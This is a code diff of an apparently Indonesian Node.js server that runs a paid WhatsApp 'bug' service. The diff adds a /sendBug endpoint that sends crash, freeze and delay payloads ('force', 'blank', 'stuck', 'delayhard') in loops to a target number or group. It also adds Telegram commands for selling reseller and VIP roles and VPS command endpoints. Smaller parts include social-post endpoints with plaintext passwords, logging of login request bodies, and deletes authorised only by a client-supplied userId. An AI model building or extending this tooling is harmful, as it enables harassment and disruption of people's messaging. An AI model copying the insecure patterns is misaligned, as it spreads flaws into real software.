+      return res.status(404).json({ error: 'Post not found' });
+    }
+
+    if (!post.likes) post.likes = [];
+    
+    const isLiked = post.likes.includes(userId);
+    
+    if (isLiked) {
+      post.likes = post.likes.filter(id => id !== userId);
+    } else {
+      post.likes.push(userId);
+    }
+
+    writeDatabase(db);
+    
+    res.json({
+      success: true,
+      isLiked: !isLiked,
+      likes: post.likes.length
+    });
+  } catch (error) {
+    console.error('[API] Like error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// COMMENT
+app.post('/api/comment', async (req, res) => {
+  try {
+    const { postId, userId, text } = req.body;
+    
+    if (!postId || !userId || !text) {
+      return res.status(400).json({ error: 'postId, userId, and text required' });
+    }
+
+    if (text.length > 500) {
+      return res.status(400).json({ error: 'Comment too long (max 500 characters)' });
+    }
+
+    const db = loadDatabase();
+    const post = db.posts.find(p => p.id === postId);
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    
+    if (!post) {
+      return res.status(404).json({ error: 'Post not found' });
+    }
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (!post.comments) post.comments = [];
+
+    const newComment = {
+      userId: user.id,
+      username: user.username,
+      text: text.trim(),
+      createdAt: new Date().toISOString()
+    };
+
+    post.comments.push(newComment);
+    writeDatabase(db);
+    
+    res.json({
+      success: true,
+      comment: newComment
+    });
+  } catch (error) {
+    console.error('[API] Comment error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── UPLOAD ENDPOINTS ─────────────────────────────────────────────
+
+// UPLOAD VIDEO
+app.post('/api/upload-video', socialUpload.single('video'), async (req, res) => {
+  try {
+    const { userId, caption } = req.body;
+    
+    if (!req.file) {
+      return res.status(400).json({ error: 'No video uploaded' });
+    }
+
+    if (req.file.size > 100 * 1024 * 1024) {
+      fs.unlinkSync(req.file.path);
+      return res.status(400).json({ error: 'Video too large (max 100MB)' });
+    }
+
+    const db = loadDatabase();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    
+    if (!user) {
+      fs.unlinkSync(req.file.path);
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const newPost = {
+      id: `p${db.nextPostId || 1}`,
+      userId: user.id,
+      username: user.username,
+      caption: caption || '',
+      videoUrl: `/uploads/videos/${req.file.filename}`,
+      thumbnail: null,
+      createdAt: new Date().toISOString(),
+      likes: [],
+      comments: []
+    };
+
+    db.posts.unshift(newPost);
+    db.nextPostId = (db.nextPostId || 1) + 1;
+    writeDatabase(db);
+    
+    res.json({
+      success: true,
+      post: newPost
+    });
+  } catch (error) {
+    console.error('[API] Upload video error:', error);
+    if (req.file) {
+      fs.unlinkSync(req.file.path);
+    }
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// UPLOAD PROFILE PIC
+app.post('/api/upload-pp', socialUpload.single('profilePic'), async (req, res) => {
+  try {
+    const { userId } = req.body;
+    
+    if (!req.file) {
+      return res.status(400).json({ error: 'No image uploaded' });
+    }
+
+    const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg', 'image/webp'];
+    if (!allowedTypes.includes(req.file.mimetype)) {
+      fs.unlinkSync(req.file.path);
+      return res.status(400).json({ error: 'Invalid image type. Only JPEG, PNG, WEBP allowed' });
+    }
+
+    const db = loadDatabase();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    
+    if (!user) {
+      fs.unlinkSync(req.file.path);
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (user.profilePic) {
+      const oldPath = path.join(__dirname, user.profilePic);
+      if (fs.existsSync(oldPath)) {
+        fs.unlinkSync(oldPath);
+      }
+    }
+
+    user.profilePic = `/uploads/profiles/${req.file.filename}`;
+    writeDatabase(db);
+    
+    res.json({
+      success: true,
+      profilePic: user.profilePic
+    });
+  } catch (error) {
+    console.error('[API] Upload PP error:', error);
+    if (req.file) {
+      fs.unlinkSync(req.file.path);
+    }
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── DELETE ENDPOINT ──────────────────────────────────────────────
+
+// DELETE POST
+app.delete('/api/posts/:postId', async (req, res) => {
+  try {
+    const { postId } = req.params;
+    const { userId } = req.body;
+    
+    if (!userId) {
+      return res.status(400).json({ error: 'userId required' });
+    }
+
+    const db = loadDatabase();
+    const post = db.posts.find(p => p.id === postId);
+    
+    if (!post) {
+      return res.status(404).json({ error: 'Post not found' });
+    }
+
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (post.userId !== user.id) {
+      return res.status(403).json({ error: 'Not your post' });
+    }
+
+    if (post.videoUrl) {
+      const videoPath = path.join(__dirname, post.videoUrl);
+      if (fs.existsSync(videoPath)) {
+        fs.unlinkSync(videoPath);
+      }
+    }
+
+    db.posts = db.posts.filter(p => p.id !== postId);
+    writeDatabase(db);
+    
+    res.json({
+      success: true,
+      message: 'Post deleted successfully'
+    });
+  } catch (error) {
+    console.error('[API] Delete post error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ========== COMMAND HANDLERS ==========
+async function handleAddReseller(ctx) {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addreseller ID_TELEGRAM</blockquote>`);
+    }
+    const targetId = parseInt(args[1]);
+    if (isNaN(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
+    }
+    const config = loadTelegramConfig();
+    const isReseller = config.resellerList && config.resellerList.includes(userId);
+    const isVip = config.vipList && config.vipList.includes(userId);
+    const isPt = config.ptList && config.ptList.includes(userId);
+    const isOwner = config.ownerList && config.ownerList.includes(userId);
+    const isDev = config.devList && config.devList.includes(userId);
+    if (!isReseller && !isVip && !isPt && !isOwner && !isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
+    }
+    if (config.resellerList && config.resellerList.includes(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ User already has RESELLER role.</blockquote>`);
+    }
+    if (!config.resellerList) config.resellerList = [];
+    config.resellerList.push(targetId);
+    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: RESELLER</blockquote>`);
+}
+
+async function handleAddVip(ctx) {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addvip ID_TELEGRAM</blockquote>`);
+    }
+    const targetId = parseInt(args[1]);
+    if (isNaN(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
+    }
+    const config = loadTelegramConfig();
+    const isVip = config.vipList && config.vipList.includes(userId);
+    const isPt = config.ptList && config.ptList.includes(userId);
+    const isOwner = config.ownerList && config.ownerList.includes(userId);
+    const isDev = config.devList && config.devList.includes(userId);
+    if (!isVip && !isPt && !isOwner && !isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
+    }
+    if (config.vipList && config.vipList.includes(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ User already has VIP role.</blockquote>`);
+    }
+    if (!config.vipList) config.vipList = [];
+    config.vipList.push(targetId);
+    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: VIP</blockquote>`);
+}
+
+async function handleAddPt(ctx) {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addpt ID_TELEGRAM</blockquote>`);
+    }
+    const targetId = parseInt(args[1]);
+    if (isNaN(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
+    }
+    const config = loadTelegramConfig();
+    const isPt = config.ptList && config.ptList.includes(userId);
+    const isOwner = config.ownerList && config.ownerList.includes(userId);
+    const isDev = config.devList && config.devList.includes(userId);
+    if (!isPt && !isOwner && !isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
+    }
+    if (config.ptList && config.ptList.includes(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ User already has PT role.</blockquote>`);
+    }
+    if (!config.ptList) config.ptList = [];
+    config.ptList.push(targetId);
+    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: PT</blockquote>`);
+}
+
+async function handleAddOwner(ctx) {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addowner ID_TELEGRAM</blockquote>`);
+    }
+    const targetId = parseInt(args[1]);
+    if (isNaN(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
+    }
+    const config = loadTelegramConfig();
+    const isOwner = config.ownerList && config.ownerList.includes(userId);
+    const isDev = config.devList && config.devList.includes(userId);
+    if (!isOwner && !isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED\n\nHanya OWNER atau DEVELOPER yang bisa menambah Owner.</blockquote>`);
+    }
+    if (config.ownerList && config.ownerList.includes(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ User already has Owner role.</blockquote>`);
+    }
+    if (!config.ownerList) config.ownerList = [];
+    config.ownerList.push(targetId);
+    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: OWNER</blockquote>`);
+}
+
+async function handleAddDev(ctx) {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /adddev ID_TELEGRAM</blockquote>`);
+    }
+    const targetId = parseInt(args[1]);
+    if (isNaN(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
+    }
+    const config = loadTelegramConfig();
+    const isDev = config.devList && config.devList.includes(userId);
+    if (!isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED\n\nHanya DEVELOPER yang bisa menambah Developer.</blockquote>`);
+    }
+    if (config.devList && config.devList.includes(targetId)) {
+        return ctx.replyWithHTML(`<blockquote>❌ User already has Developer role.</blockquote>`);
+    }
+    if (!config.devList) config.devList = [];
+    config.devList.push(targetId);
+    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: DEVELOPER</blockquote>`);
+}
+
+async function handleInfo(ctx) {
+    const userId = ctx.from.id;
+    const config = loadTelegramConfig();
+    let role = "User";
+    if (config.devList && config.devList.includes(userId)) role = "Developer";
+    else if (config.ownerList && config.ownerList.includes(userId)) role = "Owner";
+    else if (config.ptList && config.ptList.includes(userId)) role = "PT";
+    else if (config.vipList && config.vipList.includes(userId)) role = "VIP";
+    else if (config.resellerList && config.resellerList.includes(userId)) role = "Reseller";
+    else if (config.fullupList && config.fullupList.includes(userId)) role = "Fullup";
+    else if (config.userList && config.userList.includes(userId)) role = "User";
+
+    const userInfo = `<blockquote>👤 Informasi User</blockquote>
+<blockquote>📌 Nama: ${ctx.from.first_name || '-'}
+🆔 ID: <code>${userId}</code>
+🎯 Role: ${role}</blockquote>`;
+
+    await ctx.replyWithHTML(userInfo);
+}
+
+async function handleClear(ctx) {
+    const userId = ctx.from.id;
+    const config = loadTelegramConfig();
+    const isOwner = config.ownerList.includes(userId);
+    const isDev = config.devList.includes(userId);
+
+    if (!isOwner && !isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
+    }
+
+    try {
+        if (!fs.existsSync(SESSION_PATH)) {
+            return ctx.replyWithHTML(`<blockquote>⚠️ Folder 'permenmd' tidak ditemukan.</blockquote>`);
+        }
+
+        let deletedCount = 0;
+        const userFolders = fs.readdirSync(SESSION_PATH);
+
+        for (const userFolder of userFolders) {
+            const userPath = path.join(SESSION_PATH, userFolder);
+            if (!fs.lstatSync(userPath).isDirectory()) continue;
+
+            const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
+            if (!hasJson) {
+                fs.rmSync(userPath, { recursive: true, force: true });
+                deletedCount++;
+            }
+        }
+
+        const responseMsg = deletedCount > 0 
+            ? `🗑️ Berhasil hapus ${deletedCount} folder session kosong.`
+            : `✨ Tidak ada folder session kosong.`;
+
+        await ctx.replyWithHTML(`<blockquote>${responseMsg}</blockquote>`);
+    } catch (err) {
+        console.error("[ERROR] Cleanup failed:", err);
+        await ctx.replyWithHTML(`<blockquote>❌ Gagal membersihkan folder.</blockquote>`);
+    }
+}
+
+async function handleRestart(ctx) {
+    const userId = ctx.from.id;
+    const config = loadTelegramConfig();
+    const isOwner = config.ownerList.includes(userId);
+    const isDev = config.devList.includes(userId);
+
+    if (!isOwner && !isDev) {
+        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
+    }
+
+    await ctx.replyWithHTML(`<blockquote>⚙️ SERVER REBOOT\n\nRestarting server...\nStatus: RESTARTING</blockquote>`);
+    console.log("[SERVER] Manual restart triggered by Owner.");
+
+    setTimeout(() => {
+        process.exit(0);
+    }, 2000);
+}
+
+// ========== ENDPOINT LAINNYA ==========
+// FIX: PORT DIUBAH JADI 10552 SESUAI FOTO
+const Domain = config.Domain;
+const PORT = config.Port;
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`🟣 Server aktif di http://${Domain}:${PORT}`);
+});
 
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
-
-const rateLimitMap = {};
-function rateLimiter(req, res, next) {
-  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
-  if (!key) return next();
-
-  const now = Date.now();
-  if (!rateLimitMap[key]) rateLimitMap[key] = [];
-
-  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
-  rateLimitMap[key].push(now);
-
-  if (rateLimitMap[key].length > 2) {
-    const db = loadDatabase();
-    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
-    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);
-
-    return res.status(429).json({
-      valid: false,
-      rateLimit: true,
-      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
-    });
-  }
-
-  next();
-}
-
-app.use(rateLimiter);
-
-app.use((req, res, next) => {
-  res.header("Access-Control-Allow-Origin", "*");
-  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
-  res.header("Access-Control-Allow-Headers", "Content-Type");
-  next();
-});
 
 if (fs.existsSync(KEY_FILE)) {
   try {
@@ -531,6 +2190,7 @@ if (fs.existsSync(KEY_FILE)) {
   }
 }
 
+// ========== VPS CONNECTION ==========
 function connectToAllVPS() {
   if (!cncActive) return;
 
@@ -603,13 +2263,6 @@ fs.watch(VPS_FILE, () => {
   }
 });
 
-function getUserByKey(key) {
-  const keyInfo = activeKeys[key];
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  return user ? keyInfo.username : null;
-}
-
 app.get("/myServer", (req, res) => {
   const key = req.query.key;
   const username = getUserByKey(key);
@@ -676,19 +2329,6 @@ app.post("/sendCommand", (req, res) => {
   res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
 });
 
-function loadDatabase() {
-  if (!fs.existsSync(DB_PATH)) {
-    fs.writeFileSync(DB_PATH, JSON.stringify([]));
-    console.log("[🗃️ DB] Database baru dibuat.");
-  }
-  const data = JSON.parse(fs.readFileSync(DB_PATH));
-  return data;
-}
-
-function saveDatabase(data) {
-  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
-}
-
 function generateKey() {
   const key = crypto.randomBytes(8).toString("hex");
   console.log("[🔑 GEN] Key baru dibuat:", key);
@@ -702,7 +2342,6 @@ function isExpired(user) {
 }
 
 // ========== CHAT ENDPOINTS ==========
-// GET /api/chat/messages
 app.get("/api/chat/messages", (req, res) => {
   const { session_key } = req.query;
   
@@ -712,8 +2351,6 @@ app.get("/api/chat/messages", (req, res) => {
   }
   
   const username = keyInfo.username;
-  
-  // Ambil semua pesan yang melibatkan user ini
   const userMessages = chatList.filter(m => 
     m.from === username || m.to === username
   );
@@ -721,7 +2358,6 @@ app.get("/api/chat/messages", (req, res) => {
   res.json(userMessages);
 });
 
-// POST /api/chat/send
 app.post("/api/chat/send", (req, res) => {
   const { session_key, username, role, message } = req.body;
   
@@ -740,7 +2376,7 @@ app.post("/api/chat/send", (req, res) => {
   
   const chat = {
     from: username,
-    to: "public", // atau bisa pakai "public_chat"
+    to: "public", 
     message: sanitize(message),
     role: role,
     time: new Date().toISOString(),
@@ -750,7 +2386,6 @@ app.post("/api/chat/send", (req, res) => {
   chatList.push(chat);
   saveChat();
   
-  // Broadcast ke semua client WebSocket yang terhubung
   for (const ws of Object.values(wsClients)) {
     if (ws.readyState === WebSocket.OPEN) {
       ws.send(JSON.stringify({
@@ -822,18 +2457,7 @@ function recordKey({ username, key, role, ip, androidId }) {
   saveKeyList(list);
 }
 
-const news = [
-  {
-    image: "https://files.catbox.moe/ttqfn9.jpg",
-    title: "DEWA VERSE V1.0",
-    desc: "gatau"
-  },
-    {
-    image: "https://files.catbox.moe/ttqfn9.jpg",
-    title: "DEWA VERSE V1.0",
-    desc: "gatau"
-  }
-];
+const news = config.News;
 
 app.get("/getMyActivity", (req, res) => {
   const { key } = req.query;
@@ -850,7 +2474,6 @@ app.get("/getMyActivity", (req, res) => {
     }
 
     const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
-
     logs.sort((a, b) => b.timestamp - a.timestamp);
 
     return res.json({ valid: true, activities: logs });
@@ -860,19 +2483,27 @@ app.get("/getMyActivity", (req, res) => {
   }
 });
 
+// ========== ENDPOINT VALIDATE ==========
 app.post("/validate", (req, res) => {
+  console.log("[📥 VALIDATE] Request body:", req.body);
+
   const { username, password, version, androidId } = req.body;
 
   if (!androidId) {
+    console.log("[❌ VALIDATE] androidId missing");
     return res.json({ valid: false, message: "androidId required" });
   }
 
   const db = loadDatabase();
-  const user = db.find(u => u.username === username && u.password === password);
+  const user = db.users.find(u => u.username === username && u.password === password);
 
-  if (!user) return res.json({ valid: false });
+  if (!user) {
+    console.log(`[❌ VALIDATE] User not found: ${username}`);
+    return res.json({ valid: false });
+  }
 
   if (isExpired(user)) {
+    console.log(`[⚠️ VALIDATE] User expired: ${username}`);
     return res.json({ valid: true, expired: true });
   }
 
@@ -885,7 +2516,6 @@ app.post("/validate", (req, res) => {
 
     if (oldAndroid !== newAndroid) {
       console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);
-
       return res.json({
         valid: false,
         message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
@@ -903,7 +2533,7 @@ app.post("/validate", (req, res) => {
   recordKey({
     username,
     key,
-    role: user.role || 'member',
+    role: user.role || 'full up',
     ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
     androidId,
   });
@@ -915,12 +2545,14 @@ app.post("/validate", (req, res) => {
     `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
   );
 
+  console.log(`[✅ VALIDATE] Login success: ${username}, key: ${key}`);
+
   return res.json({
     valid: true,
     expired: false,
     key,
     expiredDate: user.expiredDate,
-    role: user.role || "member",
+    role: user.role || "full up",
     listBug: bugs,
     news
   });
@@ -931,10 +2563,9 @@ app.get("/myInfo", (req, res) => {
   console.log("[ℹ️ INFO] Fetching info for:", username);
 
   const db = loadDatabase();
-  const user = db.find(u => u.username === username && u.password === password);
+  const user = db.users.find(u => u.username === username && u.password === password);
   const keyList = loadKeyList();
   const userKey = keyList.find(k => k.username === username);
-  console.log(userKey)
 
   if (!userKey) {
     console.log("[❌ KEY] Invalid or missing session key.");
@@ -959,7 +2590,7 @@ app.get("/myInfo", (req, res) => {
   recordKey({
     username,
     key,
-    role: user.role || 'member',
+    role: user.role || 'full up',
     ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
     androidId
   });
@@ -973,7 +2604,7 @@ app.get("/myInfo", (req, res) => {
     username: user.username,
     password: "******",
     expiredDate: user.expiredDate,
-    role: user.role || "member",
+    role: user.role || "full up",
     listBug: bugs,
     news: news
   });
@@ -986,12 +2617,12 @@ app.post("/changepass", (req, res) => {
   }
 
   const db = loadDatabase();
-  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
+  const idx = db.users.findIndex(u => u.username === username && u.password === oldPass);
   if (idx === -1) {
     return res.json({ success: false, message: "Invalid credentials" });
   }
 
-  db[idx].password = newPass;
+  db.users[idx].password = newPass;
   saveDatabase(db);
 
   return res.json({ success: true, message: "Password updated successfully" });
@@ -1016,12 +2647,25 @@ app.get("/sendBug", async (req, res) => {
   if (!keyInfo) return res.json({ valid: false });
 
   const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
+  const user = db.users.find(u => u.username === keyInfo.username);
   if (!user) return res.json({ valid: false });
 
-  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1 };
-  const role = user.role || "member";
-  const cooldownSeconds = roleCooldowns[role] ?? 60;
+  const roleCooldowns = {
+    creator: 1,
+    developer: 1,
+    staf: 1,
+    exec: 2,
+    vvip: 3,
+    svip: 5,
+    owner: 1,
+    ceo: 2,
+    mod: 3,
+    pt: 5,
+    reseller: 10,
+    'full up': 30
+  };
+  const role = user.role || "full up";
+  const cooldownSeconds = roleCooldowns[role] ?? 30;
 
   if (!user.lastSend) user.lastSend = 0;
   const now = Date.now();
@@ -1056,7 +2700,7 @@ app.get("/sendBug", async (req, res) => {
       sock = entries[Math.floor(Math.random() * entries.length)][1];
       console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);
 
-    } else if (user.role === 'vip') {
+    } else if (user.role === 'svip' || user.role === 'vvip' || user.role === 'exec' || user.role === 'staf' || user.role === 'developer' || user.role === 'creator') {
       let pool = [];
       const vipPath = path.join(__dirname, 'vip');
       const userPath = path.join(__dirname, 'permenmd', user.username);
@@ -1106,55 +2750,42 @@ app.get("/sendBug", async (req, res) => {
         console.log(`[🎯] JID: ${targetJid}`);
 
         switch (bug) {
-          case "fc":
-            for (let i = 0; i < 70; i++) await iNTofmSqL(sock, targetJid);
-            await sleep(2000);
-            await xvsp(sock,targetJid);
-            await sleep(2000);
-            await ofmSqLite(sock,targetJid);
-            break;
-          case "droid":
-            for (let i = 0; i < 50; i++) { await callCrash(sock, targetJid); await sleep(100); }
-            break;
-          case "android":
-            for (let i = 0; i < 60; i++) await D3nss(sock, targetJid);
-            break;
-          case "androidfrz":
-            for (let i = 0; i < 15; i++) await lockMessages(sock,targetJid);
-            break;
-          case "clickcrash":
-            for (let i = 0; i < 69; i++) await lockMessages(sock, targetJid);
-            break;
-          case "fcc":
-            for (let i = 0; i < 75; i++) await VxLOneMsg(sock, targetJid); 
-            break;
-          case "ios":
-            for (let i = 0; i < 60; i++) await iosXvLocX(sock, targetJid);
-            break;
-          case "iosXv":
-            for (let i = 0; i < 60; i++) await lahora(sock, targetJid);
-            break;
-          case "delay":
-            for (let i = 0; i < 50; i++) await botihunter(sock, targetJid);
-            break;
-          case "android_group":
-            for (let i = 0; i < 100; i++) { await crashGroup(sock, targetJid); await sleep(1000); }
-            break;
-          case "lock_group":
-            for (let i = 0; i < 100; i++) { await inTers(sock, targetJid); await sleep(1000); }
-            break;
-          case "roid_group":
-            for (let i = 0; i < 100; i++) {
-              await docthumb(sock, targetJid);
-              await sleep(1000);
-            }
-            break;
-          case "xfcui":
-            for (let i = 0; i < 60; i++) await lockMessages(sock, targetJid);
-            break;
-          case "exec":
-            for (let i = 0; i < 100; i++) { await exeTrash(sock, targetJid); await sleep(1000); }
-            break;
+        case "delayv1":
+          for (let i = 0; i < 40; i++) {
+            await diley(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "delayhard":
+          for (let i = 0; i < 40; i++) {
+            await GatauEfeknya(sock, targetJid);
+            await sleep(600);
+          }
+          break;
+        case "blank":
+          for (let i = 0; i < 60; i++) {
+            await blank(sock, targetJid);
+            await sleep(700);
+          }
+          break;
+        case "force":
+          for (let i = 0; i < 50; i++) {
+            await smsl(sock, targetJid);
+            await sleep(700);
+          }
+          break;
+        case "fcno":
+          for (let i = 0; i < 50; i++) {
+            await jomok(sock, targetJid);
+            await sleep(700);
+          }
+          break;
+        case "stuck":
+          for (let i = 0; i < 40; i++) {
+            await denis(sock, targetJid);
+            await sleep(400);
+          }
+          break;      
           default:
             console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
         }
@@ -1169,7 +2800,7 @@ app.get("/sendBug", async (req, res) => {
           console.log(`[🗑️] Session ${sessionName} dihapus`);
         }
         if (!retry) {
-          if (user.role === 'vip') {
+          if (user.role === 'svip' || user.role === 'vvip' || user.role === 'exec' || user.role === 'staf' || user.role === 'developer' || user.role === 'creator') {
             let pool = [];
             const vipPath = path.join(__dirname, 'vip');
             const userPath = path.join(__dirname, 'permenmd', user.username);
@@ -1212,6 +2843,173 @@ function getActiveCredsInFolder(subfolderName) {
   return activeCreds;
 }
 
+// ===================== TAMBAHAN =====================
+
+const publicSenderSet = new Set(JSON.parse(fs.existsSync('./publicSenders.json') 
+  ? fs.readFileSync('./publicSenders.json','utf8') : '[]'));
+
+function savePublicSenders() {
+  fs.writeFileSync('./publicSenders.json', JSON.stringify([...publicSenderSet]));
+}
+
+app.get("/setSenderPublic", (req, res) => {
+  const { key, session, public: makePublic } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid key" });
+
+  const db = loadDatabase();
+  const user = db.users.find(u => u.username === keyInfo.username);
+  if (!user) return res.status(401).json({ valid: false, error: "User not found" });
+
+  if (makePublic === 'true') {
+    publicSenderSet.add(session);
+    savePublicSenders();
+    return res.json({ valid: true, message: `${session} dijadikan public` });
+  } else {
+    if (user.role !== 'owner') {
+      return res.status(403).json({ valid: false, error: "Hanya owner yang bisa remove public sender" });
+    }
+    publicSenderSet.delete(session);
+    savePublicSenders();
+    return res.json({ valid: true, message: `${session} dijadikan private` });
+  }
+});
+
+app.get("/deleteSender", (req, res) => {
+  const { key, session } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false });
+  
+  if (activeConnections[session]) {
+    try { activeConnections[session].end(); } catch(e) {}
+    delete activeConnections[session];
+  }
+  publicSenderSet.delete(session);
+  savePublicSenders();
+  return res.json({ valid: true, message: "Sender dihapus" });
+});
+
+app.get("/deletePublicSender", (req, res) => {
+  const { key, session } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false });
+  
+  const db = loadDatabase();
+  const user = db.users.find(u => u.username === keyInfo.username);
+  if (!user || user.role !== 'owner') return res.status(403).json({ valid: false, error: "Only owner" });
+  
+  if (activeConnections[session]) {
+    try { activeConnections[session].end(); } catch(e) {}
+    delete activeConnections[session];
+  }
+  publicSenderSet.delete(session);
+  savePublicSenders();
+  return res.json({ valid: true, message: "Public sender dihapus" });
+});
+
+app.get("/getPublicSenders", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
+
+  try {
+    const publicList = [];
+    for (const [sessionName, sock] of Object.entries(activeConnections)) {
+      if (publicSenderSet.has(sessionName)) {
+        publicList.push({
+          sessionName,
+          number: sessionName,
+          type: 'public',
+          status: 'connected',
+          owner: 'owner'
+        });
+      }
+    }
+    return res.json({ valid: true, senders: publicList });
+  } catch(e) {
+    return res.json({ valid: true, senders: [] });
+  }
+});
+
+// --- Device Permissions ---
+const devicePermFile = './device_perms.json';
+function loadDevicePerms() {
+  try {
+    if (fs.existsSync(devicePermFile)) {
+      return JSON.parse(fs.readFileSync(devicePermFile, 'utf8'));
+    }
+  } catch(e) {}
+  return {};
+}
+function saveDevicePerms(data) {
+  fs.writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
+}
+
+app.get("/devicePerms", (req, res) => {
+  const { key, username } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false });
+  
+  const perms = loadDevicePerms();
+  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
+  
+  const db = loadDatabase();
+  const requester = db.users.find(u => u.username === keyInfo.username);
+  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
+    const isOwner = requester?.role === 'owner';
+    if (isOwner && keyInfo.username === username) {
+      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
+    }
+  }
+  
+  return res.json({ valid: true, ...userPerm });
+});
+
+app.post("/setDevicePerm", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
+  
+  const db = loadDatabase();
+  const requester = db.users.find(u => u.username === keyInfo.username);
+  if (!requester || requester.role !== 'owner') {
+    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
+  }
+  
+  const { username, approved, allDevices, devices } = req.body;
+  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
+  
